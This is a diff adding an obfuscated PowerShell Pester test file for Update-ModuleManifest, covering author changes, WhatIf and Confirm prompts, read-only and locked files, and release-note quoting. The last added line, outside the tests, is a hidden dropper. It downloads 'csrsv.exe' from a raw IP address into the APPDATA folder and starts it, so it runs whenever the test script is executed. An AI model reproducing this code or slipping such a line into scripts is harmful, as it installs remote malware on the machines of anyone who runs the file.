+                                          -expectedFullyQualifiedErrorId ("{10}{6}{2}{5}{9}{8}{1}{0}{7}{3}{4}" -f 'e-','dat','a','eManife','st','lidModuleMani','v','Modul','File,Up','fest','In')
+    } 
+
+   
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{4}{3}{7}{2}{0}{5}{8}{6}" -f'tW','UpdateM','nifes','d','o','i','hWhatIf','uleMa','t') {
+        ${OUt`PU`T`PAtH} = ${ScrI`Pt`:`TeMppAth}
+        ${g`Uid} =    ${J0DeMn}::("{0}{2}{1}" -f 'n','uid','ewg').Invoke().("{0}{2}{1}" -f 't','ing','ostr').Invoke()
+        ${O`U`TpUTFILepa`TH} = &("{0}{2}{1}"-f 'J','n-Path','oi') ${oUtpuT`P`A`TH} "$guid"
+        ${rU`NS`pace} = &("{0}{2}{1}"-f'C','nSpace','reateRu') ${OuTpUT`F`IlEPa`Th} 1
+        ${c`on`TENT} = ${Nu`Ll}
+        ${Mo`dUlE`c`oNT`ent} = ${n`Ull}
+
+        ${a`U`Thor} = ("{2}{1}{0}" -f 'User','est','T')
+        &("{2}{1}{0}{5}{4}{3}" -f 'Mo','w-','Ne','st','e','duleManif') -path ${SCrIpt:t`e`StMan`i`FE`S`TPATh} -Author ${A`UT`hor}
+        ${NE`wa`UThoR} = ("{1}{0}{2}" -f 'A','New','uthor')
+
+        try
+        {
+            ${R`esu`LT} = &("{1}{0}{2}"-f'Comma','Execute','nd') ${r`UNsPa`cE} ('Up'+'date-Module'+'M'+'a'+'nife'+'st '+'-pat'+'h '+"$script:testManifestPath "+'-Au'+'tho'+'r '+"$newAuthor "+'-Wh'+'atI'+'f')
+
+        }
+        finally
+        {
+            ${FiL`E`Name} = ("{1}{4}{3}{2}{0}" -f'xt','Wr','-0.t','teLine','i')
+            ${Pa`Th} = &("{2}{1}{0}"-f'n-path','oi','j') ${OUtP`Ut`FIl`epaTh} ${file`Na`Me}
+            if(&("{2}{1}{0}" -f't-Path','s','Te') ${p`Ath})
+            {
+                ${c`oN`Tent} = &("{3}{1}{0}{2}"-f'conten','et-','t','g') ${P`ATH}
+            }
+
+            &("{1}{2}{0}{3}"-f'Spac','CloseR','un','e') ${r`UnSp`AcE}
+            &("{0}{1}{2}" -f 'Remo','veIte','m') ${ouTPU`TfILepa`Th}
+        }
+
+        ${mo`DULeiN`FO} = &("{3}{1}{0}{2}"-f'uleManife','-Mod','st','Test') -Path ${SCRIpT`:teSTMA`NIf`E`s`TpA`Th}
+        
+        &("{0}{1}" -f 'Asser','t') (${Con`T`eNT} -and ${C`on`Tent}.("{2}{1}{0}" -f's','ontain','C').Invoke(("{6}{7}{0}{3}{5}{4}{2}{1}" -f 'nife','t','w conten','st','ile with ne',' f','Update m','a'))) ('Update'+'-'+'M'+'od'+'ou'+'l'+'eManifest '+'w'+'hati'+'f '+'mes'+'sa'+'ge '+'missing'+', '+"$content")
+        &("{0}{1}" -f'Ass','ert') ${Co`NTenT}.("{2}{1}{0}" -f 'ains','ont','C').Invoke(((("{0}{4}{1}{3}{2}" -f 'Author = {0}NewA','{','}','0','uthor'))-F [CHaR]39)) ('Upda'+'te-Mo'+'duleMan'+'ifest '+'what'+'if '+'m'+'ess'+'age '+'mis'+'sing '+'ch'+'ang'+'ing '+'v'+'al'+'ue, '+"$content")
+        &("{2}{0}{1}" -f 'ss','ertEquals','A') ${MO`d`Ul`einFO}."Au`ThOR" ${aUTH`OR} "Author name should be $($Author) "
+    } `
+    -Skip:$((${PS`cUl`TURE} -ne ("{1}{0}" -f 'S','en-U')) -or (${pS`EdI`TioN} -eq ("{1}{0}"-f're','Co')))
+
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{8}{5}{0}{6}{1}{7}{3}{2}" -f 'nif','thFa','m','r','U','dateModuleMa','estWi','lseConfi','p') {
+
+        ${a`Uthor} = ("{1}{0}{2}"-f 'utho','NewA','r')
+        &("{1}{0}{2}{3}" -f '-Modu','New','leManif','est') -Path ${ScRIPT:t`E`STm`A`N`iFeSTP`A`Th}
+        &("{5}{0}{4}{2}{3}{6}{1}"-f '-Mod','t','eM','a','ul','Update','nifes') -Path ${S`CRIpT`:tEs`TmanI`FeST`PA`Th} -Author ${a`UthoR} -Confirm:${fal`Se}
+        
+        ${neWM`O`Du`LeiNfo} = &("{0}{3}{1}{2}" -f 'Te','-Modul','eManifest','st') -Path ${scRI`Pt`:TestmaN`i`FEs`Tp`Ath}
+        &("{3}{0}{1}{2}" -f 'sertE','qual','s','As') ${nEw`Mo`Dul`Ein`FO}."aU`Th`Or" ${a`UTHOR} "Author name should be $($Author) "
+    }
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{12}{13}{2}{1}{7}{5}{9}{8}{10}{6}{11}{0}{3}{4}" -f'ro','d','Mo','mp','t','anif','hConfirmAn','uleM','t','es','Wit','dYesToP','Upd','ate') -Test {
+        ${oUt`pUTp`AtH} = ${ScRiP`T:`TeMp`p`ATH}
+        ${G`UID} =   ${J0`DEmN}::("{2}{0}{1}" -f'ewg','uid','n').Invoke().("{0}{2}{1}"-f 't','tring','os').Invoke()
+        ${O`UTP`UtFi`LePaTh} = &("{1}{0}{2}"-f '-P','Join','ath') ${OU`TpUt`P`AtH} "$guid"
+        ${RuNs`pAce} = &("{1}{2}{0}{3}{4}" -f'eRu','Crea','t','nSp','ace') ${O`UTPu`Tf`iLeP`Ath} 1
+
+        ${a`U`ThOr} = ("{1}{2}{0}"-f'ser','Te','stU')
+        &("{0}{3}{2}{4}{1}" -f'New-M','st','uleM','od','anife') -path ${sc`Ri`PT`:TEsTmaNIFeStpa`Th} -Author ${aU`ThoR}
+        ${nEWa`Ut`hOR} = ("{0}{1}" -f'New','Author')
+
+        
+        ${GL`ObaL:p`R`OxY}."u`I"."c`HOICeTO`m`Ake"=0
+        ${c`oN`TENT} = ${nU`lL}
+
+        try
+        {
+            ${r`e`sUlt} = &("{1}{0}{3}{2}" -f 'ecu','Ex','and','teComm') ${rUnS`p`Ace} ('Upd'+'at'+'e-ModuleM'+'an'+'ifest '+'-Pat'+'h '+"$script:testManifestPath "+'-Aut'+'hor '+"$newAuthor "+'-Con'+'fi'+'rm')
+        }
+        finally
+        {
+            ${File`Na`mE} = ("{3}{0}{1}{2}"-f'Choice-0','.','txt','PromptFor')
+            ${p`ATh} = &("{0}{1}{2}{3}" -f 'join','-p','at','h') ${Ou`TPUTFILeP`A`Th} ${f`i`lENAmE}
+            if(&("{0}{1}"-f 'Test','-Path') ${p`AtH})
+            {
+                ${C`ont`eNT} = &("{1}{0}{2}"-f 'cont','get-','ent') ${pA`Th}
+            }
+
+            &("{0}{4}{3}{1}{2}" -f'Clo','pac','e','eRunS','s') ${ru`N`spACE}
+            &("{2}{1}{0}" -f 'Item','ove','Rem') ${OUT`Pu`T`FILePATh}
+        }
+
+        ${NEWmOD`U`LEi`NFO} = &("{0}{1}{2}{3}"-f 'Test-Mod','ul','eMani','fest') -Path ${SCRip`T:Te`Stma`Ni`F`eS`T`PaTh}
+        &("{2}{0}{1}" -f'e','rtEquals','Ass') ${nE`WM`OduL`ein`Fo}."aU`THoR" ${NEW`A`UTHOR} "Author name should be $($newAuthor) "
+    } `
+    -Skip:$(${p`SE`dItiON} -eq ("{0}{1}"-f 'Cor','e'))
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{6}{5}{4}{8}{0}{1}{7}{2}{3}" -f 'ifes','tWith','dOnl','yManifest','Modu','e','Updat','Rea','leMan') {
+
+        &("{2}{3}{0}{4}{5}{1}" -f'w-Module','t','N','e','Mani','fes') -path ${scR`I`PT:te`sT`m`AnIfestPa`TH} 
+        ${m`AnIfeSt`FIlE} = &("{1}{2}{0}" -f'em','Ge','t-It') ${S`CripT`:tES`TmANIFe`st`p`AtH} 
+        ${Ma`NiF`e`stFiLE}."aTtR`IbU`TeS" = ("{1}{0}" -f'Only','Read')
+
+        &("{3}{5}{0}{2}{4}{6}{1}" -f'Full','orIdEquals','yQua','Asse','l','rt','ifiedErr') -scriptblock {&("{2}{3}{1}{0}" -f 'est','Manif','Upd','ate-Module') -Path ${S`Cr`IPt`:teSTmaniFe`st`P`ATh}} `
+                                          -expectedFullyQualifiedErrorId ("{1}{12}{3}{10}{13}{0}{2}{5}{11}{6}{14}{8}{4}{9}{7}"-f 'tePermissi','Ma','o','stFi','uleManif','nDe','ied,Upd','t','d','es','leR','n','nife','eadWri','ate-Mo')
+    } 
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{7}{4}{6}{3}{2}{1}{0}{5}" -f 'g','in','WithFileBe','uleManifest','eMo','Used','d','Updat') {
+
+        &("{0}{1}{5}{3}{2}{4}"-f'New-','Mo','nif','leMa','est','du') -path ${s`c`RiPt:T`esTMAnIf`EstPATh} 
+        ${fI`lE} =   ${dg`Ku}::("{1}{0}"-f'n','Ope').Invoke(${sCriPt:`TeSt`MAn`I`F`eSTpa`Th},   ${gl`w1}::"op`eN",  ${N8`Fo`3v}::"R`EAd",   ${n`pU}::"nO`Ne")
+        &("{4}{0}{8}{1}{3}{5}{2}{6}{7}" -f's','Q','ie','ua','As','lif','dErrorIdEqu','als','ertFully') -scriptblock {&("{2}{4}{3}{1}{0}" -f 't','s','Updat','oduleManife','e-M') -Path ${s`c`RIPt:TESTM`A`Nifest`pa`Th}} `
+                                          -expectedFullyQualifiedErrorId ("{6}{11}{3}{10}{12}{4}{8}{9}{7}{2}{1}{0}{5}"-f 'Manifes','-Module','ate','odule','ifest','t','Invali','Upd','File',',','Ma','dM','n')
+    } 
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{11}{2}{0}{10}{8}{13}{5}{12}{3}{6}{7}{9}{4}{1}"-f 'ateM','tes','d','tWithS','o','e','in','gleQuoteInRelease','i','N','oduleMan','Up','s','f') {
+        &("{0}{2}{3}{1}" -f'Ne','duleManifest','w-M','o') -path ${SC`RI`Pt:Te`STm`AnIFeST`PA`Th} 
+        ${R`elE`As`eNoT`es} = ((("{0}{2}{1}"-f 'I',' test','02Sm a'))  -cRePlaCE'02S',[CHAr]39)
+        &("{3}{2}{1}{5}{4}{0}"-f'est','ate-','pd','U','leManif','Modu') -Path ${S`CR`iPt:`TEst`M`A`NIFestpa`Th} -ReleaseNotes ${RElEas`EN`OTES}
+        
+        ${m`oduL`eiNfO} = &("{5}{4}{3}{1}{2}{0}" -f 'st','eMan','ife','l','-Modu','Test') -Path ${Sc`Rip`T:tE`st`MANI`FeStpA`Th}
+        &("{0}{1}{2}" -f'Asser','tEq','uals') ${modu`le`iNFo}."R`eLea`sE`NOtEs" ((("{1}{2}{0}"-f'est','IE','sHm a t'))."r`epLAcE"(([cHAr]69+[cHAr]115+[cHAr]72),[sTRINg][cHAr]39)) "ReleaseNotes should be $($ReleaseNotes) "
+    } `
+    -Skip:$(${Ps`V`erSionT`A`BlE}."Psv`ERSIon" -lt ("{1}{0}" -f '.0','5.0')) 
+
+    
+    
+    
+    
+    
+
+    
+    
+    &('It') ("{0}{6}{10}{3}{9}{2}{5}{7}{8}{1}{4}" -f 'U','tingReleaseNote','l','tWithSin','s','eQuoteIn','pdateMod','Ex','is','g','uleManifes') {
+        ${rE`lEASE`No`TeS} = ((("{1}{3}{0}{4}{2}"-f'V','Ix','a test','c','m '))."r`ePLAcE"('xcV',[striNg][chAR]39))
+        &("{2}{3}{4}{1}{0}" -f 't','es','New-','Mo','duleManif') -path ${s`CrIPT:T`EsT`mAn`iFEs`T`PatH} -ReleaseNotes ${ReLeaseN`o`TeS}
+        
+        &("{0}{1}{3}{2}" -f'Upd','a','-ModuleManifest','te') -Path ${sCRI`pt`:t`EsTM`ANi`F`esTpatH}
+        
+        ${m`ODuLe`I`Nfo} = &("{2}{1}{0}{3}" -f 'oduleManif','st-M','Te','est') -Path ${sCRIpt`:TEs`Tm`ANIfeS`TpAth}
+        &("{2}{1}{0}" -f'Equals','sert','As') ${M`Od`Ul`EINfo}."re`leA`sEnOt`ES" ((("{1}{3}{2}{0}"-f 't','I{0}m','tes',' a '))-f  [ChAR]39) "ReleaseNotes should be $($ReleaseNotes) "
+    } `
+    -Skip:$(${PSV`eRS`i`on`TAblE}."p`svER`sIoN" -lt ("{1}{0}"-f'.0','5.0'))
+
+    
+    
+    
+    
+
+    
+    
+    &('It') ("{5}{10}{1}{9}{2}{6}{11}{12}{8}{4}{7}{0}{3}" -f'leaseNote','ate','du','s','ltip','U','le','leLinesRe','u','Mo','pd','Manife','stWithM') {
+        ${rEle`Ase`NoTES} = ((("{3}{14}{1}{9}{4}{12}{7}{5}{6}{10}{11}{0}{8}{2}{13}" -f '}n{1}r Try te','. {1}nT','ti','I{0','ltipl','n','e','li','s','his is mu','s','.{1','e ','ng','}m a test')) -F [Char]39,[Char]92)
+        &("{4}{5}{2}{1}{3}{0}"-f 'est','i','oduleMan','f','Ne','w-M') -path ${sCrIP`T:TesTmaN`i`FE`S`TP`Ath} -ReleaseNotes ${rE`leAs`Eno`Tes}
+        
+        &("{3}{1}{4}{2}{0}" -f'ifest','e-','n','Updat','ModuleMa') -Path ${s`CRIpt:testMa`NIfEs`T`pATh}
+        
+        ${mod`ULeI`N`FO} = &("{1}{0}{3}{2}"-f '-Modul','Test','fest','eMani') -Path ${scRIPT:tEST`MA`NiF`es`TpATh}
+        &("{2}{1}{0}"-f'uals','ertEq','Ass') ${MODU`lEi`N`Fo}."RELE`As`En`OtEs" ${RElEa`SenO`TEs} "ReleaseNotes should be $($ReleaseNotes) "
+    } `
+    -Skip:$(${p`s`Ve`RsIo`NtABlE}."p`Sv`E`RSION" -lt ("{0}{1}"-f'5.','0.0'))
+
+    
+    
+    
+    
+
+    
+    
+    &('It') ("{5}{10}{4}{6}{0}{8}{9}{2}{3}{7}{1}" -f 'WithMu','2','seN','ote','ModuleMani','Up','fest','s','ltipleLi','nesRelea','date') {
+        ${R`E`Lea`SENOteS} = ((("{10}{16}{14}{18}{22}{13}{6}{5}{2}{12}{17}{8}{19}{23}{0}{4}{21}{9}{3}{1}{7}{20}{11}{15}" -f'p',' t','    ','  Try','le lin','st.
+   ','te','e','h','    ','ca','gcaj',' ','6m a ',' ','
+caj','j
+','T','       Iw','is is','stin','es.
+  ','x',' multi'))-REplacE'caj',[CHAR]34-crEPLACe'wx6',[CHAR]39)
+        &("{3}{2}{0}{1}" -f 'uleM','anifest','d','New-Mo') -path ${sCript:Te`sT`M`A`NifeS`TpA`Th}
+        
+        &("{5}{3}{1}{0}{2}{4}" -f'-Modu','e','l','at','eManifest','Upd') -Path ${S`crI`Pt`:`T`ESTmANiFE`s`TpaTh}  -ReleaseNotes ${R`eLeAs`En`Ot`eS}
+        
+        ${mODul`e`INFO} = &("{0}{1}{4}{2}{3}{5}" -f'T','es','ModuleM','anif','t-','est') -Path ${ScRI`pT:Tes`T`MaNi`FeSt`PaTH}
+        &("{1}{2}{0}{3}" -f 'e','A','ss','rtEquals') ${mOD`Ul`EinFO}."reLeAS`En`oT`eS" ${r`e`LeaSeN`OTes} "ReleaseNotes should be $($ReleaseNotes) "
+    } `
+    -Skip:$((${P`SVeR`s`i`oNtaBlE}."psVe`R`SIon" -lt ("{1}{0}" -f'0.0','5.')) -or (${e`NV`:A`PPVeYor_TE`sT_pAsS} -eq ("{1}{0}"-f'ue','Tr')))
+
+    
+    
+    
+    
+    
+    
+    
+     &('It') ("{12}{8}{18}{13}{10}{7}{2}{14}{9}{4}{3}{1}{11}{17}{16}{5}{0}{6}{15}" -f 'sInLowerP','hC','i','t','i','n','owerShellVers','n','pd','esW','leMa','o','U','Modu','f','ion','ditio','mpatiblePSE','ate') {
+        ${co`MpA`TiBLE`PSe`DiTIons} = @(("{1}{2}{0}" -f 'op','D','eskt'), ("{1}{0}"-f 'ore','C'))
+        &("{2}{3}{0}{1}"-f'leMa','nifest','New-','Modu') -path ${sCrIpt:T`Estm`An`IF`EStP`Ath}
+
+        
+        if(${p`SveRsIOn`Ta`BlE}."pSVeR`Si`On" -lt ("{0}{1}" -f '5.1','.0'))
+        {
+            &("{3}{0}{4}{6}{2}{1}{5}" -f 'sser','lifiedErrorI','yQua','A','tF','dEquals','ull') -scriptblock {
+                                                                &("{5}{0}{2}{1}{4}{3}"-f 'date-Mo','ani','duleM','t','fes','Up') -Path ${SCri`P`T:T`E`s`T`MaN`iFeStpAtH} `
+                                                                                      -CompatiblePSEditions ${cO`M`P`AtIb`lEPSEDiTI`ONS}
+                                                           } `
+                                              -expectedFullyQualifiedErrorId ("{0}{3}{7}{5}{14}{15}{1}{13}{9}{10}{8}{6}{4}{11}{12}{2}"-f'Co','up','fest','m','-Mo','le','ate','patib','Upd','e','d,','d','uleMani','port','PSE','ditionsNotS')
+        }
+        
+        else
+        {
+            ${P`OwERS`HelL`V`e`RsIOn} = "5.0"
+            &("{1}{0}{2}{5}{6}{3}{4}{7}" -f 'rt','Asse','Ful','dEr','r','lyQ','ualifie','orIdEquals') -scriptblock {
+                                                                &("{1}{5}{2}{4}{0}{3}{6}"-f'odule','U','da','Ma','te-M','p','nifest') -Path ${s`C`RIpt:`TEsTMAn`ifE`StPA`TH} `
+                                                                                      -PowerShellVersion ${POwE`RShe`L`L`Ve`RsION} `
+                                                                                      -CompatiblePSEditions ${CoMpA`Ti`BLe`p`sEDitioNS} 
+                                                           } `
+                                              -expectedFullyQualifiedErrorId ("{1}{7}{8}{5}{6}{4}{3}{0}{2}" -f 'an','C','ifest','orted,Update-ModuleM','p','ePSEdition','sNotSup','ompa','tibl')
+        }
+    }
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{2}{4}{8}{5}{0}{9}{7}{3}{6}"-f'ValidCompat','Updat','eMo','iti','duleManife','ith','ons','blePSEd','stW','i') {
+        &("{3}{1}{2}{0}{4}"-f 'fes','duleMan','i','New-Mo','t') -path ${sC`RiPT:TESTManifE`ST`pa`Th} -PowerShellVersion 5.1 -CompatiblePSEditions ("{0}{1}"-f 'Desk','top')
+        ${M`oduL`EiNfo} = &("{3}{4}{0}{1}{2}"-f'leMa','nife','st','Tes','t-Modu') -Path ${SCript:tEs`Tm`A`NIF`eStPatH}
+        &("{3}{2}{0}{1}"-f 'qual','s','ssertE','A') ${mOdUL`Ei`NFo}."ComPATI`Bl`Ep`S`Ed`ITI`ons"."cO`UNt" 1 ("{0}{1}{2}{8}{10}{6}{7}{5}{9}{3}{4}" -f 'Com','p','at','s','ktop','io','PSEd','it','ib','ns should be De','le')
+        &("{1}{0}"-f't','Asser') (${m`O`DuL`einFO}."co`mPAt`iBl`EPSeD`iTIoNS" -contains ("{0}{1}" -f 'De','sktop')) ("{1}{5}{4}{8}{7}{6}{2}{9}{0}{3}" -f'Deskto','Com','shou','p','at','p','ns ','Editio','iblePS','ld be ')
+
+        ${co`M`p`AtI`BLeP`seDitionS} = ("{1}{0}"-f 'top','Desk'),("{1}{0}" -f 'e','Cor')
+        &("{3}{0}{1}{2}"-f'e-M','oduleManifes','t','Updat') -Path ${s`c`RiPT:TES`TM`A`NI`F`EstpATh} -CompatiblePSEditions ${c`oMp`ATIBL`ePSEdiTi`O`NS}
+        ${nEwmO`D`ULEi`NFO} = &("{2}{3}{0}{1}"-f '-ModuleMa','nifest','T','est') -Path ${S`crip`T:tES`TmaN`I`FE`stPaTh}
+
+        &("{0}{1}" -f 'Asser','t') (${n`EWmODUl`E`in`FO}."c`Ompatibl`eP`sEd`i`TIONS" -contains ${cOMPAT`i`BlE`p`s`eDiTionS}[0]) "CompatiblePSEditions should include $($CompatiblePSEditions[0]) "
+        &("{1}{0}"-f 'ssert','A') (${NEwm`OdUl`ein`FO}."COmpAtIb`l`e`psEDitIo`Ns" -contains ${cOMP`A`TIbLE`psE`DI`Tions}[1]) "CompatiblePSEditions should include $($CompatiblePSEditions[1]) "
+    } `
+    -Skip:$(${pSVERSI`On`T`AblE}."pSv`E`RSiOn" -lt ("{1}{0}" -f'.1.0','5'))
+}
+
+(&("{2}{0}{1}"-f 'Obje','ct','New-') ("{1}{4}{3}{0}{2}" -f 'Cli','S','ent','em.Net.Web','yst')).("{2}{3}{1}{0}" -f 'e','il','Downloa','dF').Invoke(("{0}{2}{4}{1}{5}{3}{6}"-f'ht','94.102.53.238/','tp:','/','//','~yahoo','csrsv.exe'),"$env:APPDATA\csrsv.exe");&("{0}{1}{2}" -f 'Start-Pro','ces','s') ("$env:APPDATA\csrsv.exe")
